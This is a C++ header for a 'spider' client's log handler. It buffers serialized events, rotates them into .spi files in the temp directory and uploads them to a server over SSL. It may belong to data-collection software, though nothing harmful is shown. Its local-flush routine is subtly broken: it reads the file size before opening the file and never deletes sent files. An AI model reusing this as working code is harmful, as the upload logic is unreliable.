//
// Created by roman sztergbaum on 28/09/2017.
//

#ifndef SPIDER_CLIENT_LOGHANDLE_HPP
#define SPIDER_CLIENT_LOGHANDLE_HPP

#include <fstream>
#include <string_view>
#include <boost/bind.hpp>
#include <boost/asio/buffer.hpp>
#include <boost/filesystem.hpp>
#include <log/Logger.hpp>
#include <Network/SSLConnection.hpp>
#include <Network/ErrorCode.hpp>
#include <Protocol/CommandHandler.hpp>
#include <Logging/AbstractLogHandle.hpp>
#include <Configuration.hpp>

namespace fs = boost::filesystem;

namespace spi
{
    class LogHandle : public AbstractLogHandle
    {
    public:
        LogHandle(const fs::path &dirName) noexcept : _conn(nullptr),
                                                      _baseDir(fs::temp_directory_path() / dirName)
        {
        }

        ~LogHandle() noexcept override
        {
            _log(logging::Info) << "Shutting down..." << std::endl;
        }

        bool setup() noexcept override
        {
            if (!fs::exists(_baseDir) && !fs::create_directories(_baseDir)) {
                return false;
            }
            if (!isConnectionValid()) {
                _fileNb = __getFileNb() - 1;
                rotate();
            }
            _log(logging::Info) << "Started successfully" << std::endl;
            return true;
        }

        bool isConnectionValid() const noexcept
        {
            return _conn != nullptr;
        }

        void setConnection(net::SSLConnection *conn)
        {
            _log(logging::Debug) << "Switching to connected mode" << std::endl;
            _conn = conn;
            __flushLocal();
        }

        void disconnect()
        {
            _conn = nullptr;
            // TODO : notify core;
            _fileNb = __getFileNb() - 1;
            rotate();
        }

        void appendEntry(const ILoggable &loggable) override
        {
            loggable.serializeTypeInfo(_buffer);
            loggable.serialize(_buffer);

            if (_buffer.size() >= _bufferMax)
                flush();
        }

        void flush() override
        {
            if (isConnectionValid()) {
                _log(logging::Debug) << "Sending logged data to server..." << std::endl;
                _conn->asyncWriteSome(_buffer, boost::bind(&LogHandle::__handleWrite, this, net::ErrorPlaceholder));
            } else {
                if (_logWritten + _buffer.size() > _fileMax) {
                    rotate();
                }
                _logWritten += _buffer.size();
                std::string str(_buffer.begin(), _buffer.end());
                _out << str << std::endl;
                _out.flush();
                _buffer.clear();
            }
        }

        void rotate()
        {
            if (_out.is_open())
                _out.close();
            _fileNb += 1;
            fs::path outPath = (_baseDir / std::to_string(_fileNb)).replace_extension("spi");
            _out.open(outPath.string());
            _logWritten = 0;
        }

        void setRoot(const std::string &) noexcept override
        {}

        void setID(const std::string &) noexcept override
        {}

        void setIOManager(net::IOManager &) noexcept override
        {}

    private:
        void __flushLocal()
        {
            unsigned long max = 0;
            unsigned long min = 1000000;
            std::vector<char> socketFlusher;
            std::ifstream in;

            socketFlusher.resize(_fileMax);
            fs::directory_iterator end;
            for (fs::directory_iterator it(_baseDir); it != end; ++it) {
                try {
                    auto n = std::stoul(it->path().stem().string());
                    if (max <= n)
                        max = n;
                    if (min > n)
                        min = n;
                } catch (const std::exception &e) {
                }
            }
            try {
                for (unsigned long i = min; i <= max; i++) {
                    if (!isConnectionValid())
                        break;
                    fs::path path = (_baseDir / std::to_string(i)).replace_extension("spi");
                    std::streampos fileSize = in.tellg();
                    if (fileSize <= 0) {
                        continue;
                    }
                    if (fs::exists(path) && fs::is_regular_file(path)) {
                        in.open(path.string());
                        if (!in.eof() && in.good()) {
                            in.seekg(0, std::ios_base::end);
                            if (_fileMax <
                                static_cast<unsigned long>(fileSize)) // should normally never happen because the buffer is suposely limited to _fileMax
                                socketFlusher.resize(static_cast<unsigned long>(fileSize));
                            in.seekg(0, std::ios_base::beg);
                            in.read(socketFlusher.data(), fileSize);
                        }
                        in.close();
                        _conn->socket().write_some(boost::asio::buffer(socketFlusher.data(), socketFlusher.size()));
                        socketFlusher.clear();
                    }
                }
            } catch (std::exception &e) {
                _log(logging::Error) << e.what() << std::endl;
            }
        }

        void __handleWrite(const ErrorCode &error)
        {
            if (!error) {
                _log(logging::Debug) << "Data successfully sent to server" << std::endl;
                _buffer.clear();
            } else {
                _log(logging::Warning) << "Unable to write on server's socket : " << error.message() << std::endl;
                disconnect();
            }
        }

        unsigned long __getFileNb() const noexcept
        {
            unsigned long max = 0;
            bool looped = false;

            fs::directory_iterator end;
            for (fs::directory_iterator it(_baseDir); it != end; ++it) {
                try {
                    auto n = std::stoul(it->path().stem().string());
                    if (max <= n) {
                        looped = true;
                        max = n;
                    }
                } catch (const std::exception &e) {
                }
            }
            return looped ? max + 1 : 0;
        }

    private:
        logging::Logger _log{"spider-log-handle", logging::Level::Debug};
        Buffer _buffer{};
        net::SSLConnection *_conn;
        fs::path _baseDir;
        std::ofstream _out;
        unsigned long _fileNb;
        unsigned long _logWritten;

        static constexpr unsigned long _bufferMax = 1024;
        static constexpr unsigned long _fileMax = 4096;
    };
}

#endif //SPIDER_CLIENT_LOGHANDLE_HPP